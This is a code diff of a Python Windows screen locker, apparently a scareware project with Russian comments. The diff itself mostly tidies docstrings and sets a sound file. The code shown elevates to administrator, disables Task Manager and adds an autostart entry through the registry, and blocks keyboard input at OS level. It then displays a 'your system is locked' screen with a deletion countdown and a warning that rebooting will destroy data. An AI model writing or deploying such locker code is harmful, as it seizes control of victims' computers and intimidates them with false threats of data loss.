@@ -23,7 +23,7 @@ RED, GREEN, ORANGE, GREY, BLACK = (
 
 # -------------------------------- Системные функции ----------------------- #
 def set_registry_settings(disable=True):
-    """Отключает/включает Диспетчер задач и управляет записью в автозагрузке."""
+    """Отключает/включает Диспетчер задач и управляет записью в реестре автозагрузке"""
     try:
         reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
         try:
@@ -57,7 +57,7 @@ def set_registry_settings(disable=True):
 
 
 def is_admin():
-    """Проверяет, запущен ли скрипт с правами администратора."""
+    """Проверяет запущен ли скрипт с правами администратора"""
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except Exception:
@@ -65,7 +65,7 @@ def is_admin():
 
 
 def run_as_admin():
-    """Перезапускает текущий скрипт с запросом прав администратора."""
+    """Перезапускает текущий скрипт с запросом прав администратора"""
     if is_admin():
         return True
     else:
@@ -76,18 +76,21 @@ def run_as_admin():
 
 
 def play_sound():
-    """Воспроизводит аудиофайл (в данный момент путь пуст)."""
+    """Воспроизводит аудиофайл"""
     try:
-        playsound("")
+        playsound("sound.mp3")
     except Exception:
         pass
+
+
 def block_keys():
-    """Блокирует ввод всех клавиш на уровне ОС, кроме цифр и Backspace."""
+    """Блокирует ввод всех клавиш на уровне ОС, кроме цифр и Backspace"""
     allowed_keys = {
         '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 
         'backspace', 'clear'
     }
 
+    
     def filter_keyboard_events(event):
 
         if event.name in allowed_keys:
@@ -100,7 +103,7 @@ def block_keys():
 
 
 def update_stats(root, cpu_label, ram_perc_label, ram_gb_label):
-    """Обновляет текстовые метки с данными о загрузке ЦП и ОЗУ."""
+    """Обновляет текстовые метки с данными о загрузке ЦП и ОЗУ"""
     cpu = psutil.cpu_percent()
     ram = psutil.virtual_memory()
 
@@ -117,7 +120,7 @@ def update_stats(root, cpu_label, ram_perc_label, ram_gb_label):
 
 
 def get_sys_info():
-    """Собирает имя пользователя и локальный IP-адрес системы."""
+    """Собирает имя пользователя и локальный IP-адрес системы"""
     try:
         user = getpass.getuser()
         ip = socket.gethostbyname(socket.gethostname())
@@ -126,11 +129,11 @@ def get_sys_info():
         return
 
 
+
 current_answer = 0
 
-
 def generate_math_problem():
-    """Генерирует случайный пример и безопасно сохраняет ответ."""
+    """Генерирует случайный пример и безопасно сохраняет ответ"""
     global current_answer
     a = random.randint(10, 99)
     b = random.randint(10, 99)
@@ -148,7 +151,7 @@ def generate_math_problem():
 
 # -------------------------------- Интерфейс ------------------------------- #
 def window():
-    """Создает и настраивает главное графическое окно блокировщика."""
+    """Создает и настраивает главное графическое окно блокировщика"""
     if not is_admin():
         run_as_admin()
 
@@ -218,8 +221,8 @@ def window():
     ram_gb_label.pack()
 
     warn_text = (
-        "ВНИМАНИЕ! Не пытайтесь перезагружать или отключать ваш ПК. "
-        "Это приведет к полной потере данных."
+        "ВНИМАНИЕ! Не пытайтесь перезагружать или отключать ваш ПК "
+        "Это приведет к полной потере данных"
     )
     tk.Label(
         root, text=warn_text, fg=GREY, bg=BLACK, font=("Consolas", 10)
@@ -242,7 +245,7 @@ def window():
     password_entry.focus_set()
 
     def check():
-        """Проверяет ответ. Если верно — снимает блокировки."""
+        """Проверяет ответ. Если верно — снимает блокировки"""
         if password_entry.get() == current_answer:
             set_registry_settings(False)
             keyboard.unhook_all()
@@ -250,7 +253,7 @@ def window():
             root.destroy()
         else:
             password_entry.delete(0, tk.END)
-            main_label.config(text="НЕВЕРНЫЙ ПАРОЛЬ!")
+            main_label.config(text="НЕВЕРНЫЙ ПАРОЛЬ")
             root.after(
                 2000,
                 lambda: main_label.config(text="ВАША СИСТЕМА ЗАБЛОКИРОВАНА"),
@@ -267,13 +270,13 @@ def window():
     btn.pack(pady=10)
 
     def flash():
-        """Создает эффект мигания главного заголовка."""
+        """Создает эффект мигания главного заголовка"""
         color = main_label.cget("fg")
         main_label.config(fg="#1a1a1a" if color == RED else RED)
         root.after(600, flash)
 
     def countdown(seconds):
-        """Отображает обратный отсчет времени на экране."""
+        """Отображает обратный отсчет времени на экране"""
         if seconds > 0:
             m, s = divmod(seconds, 60)
             timer_label.config(text=f"Удаление через: {m:02d}:{s:02d}")
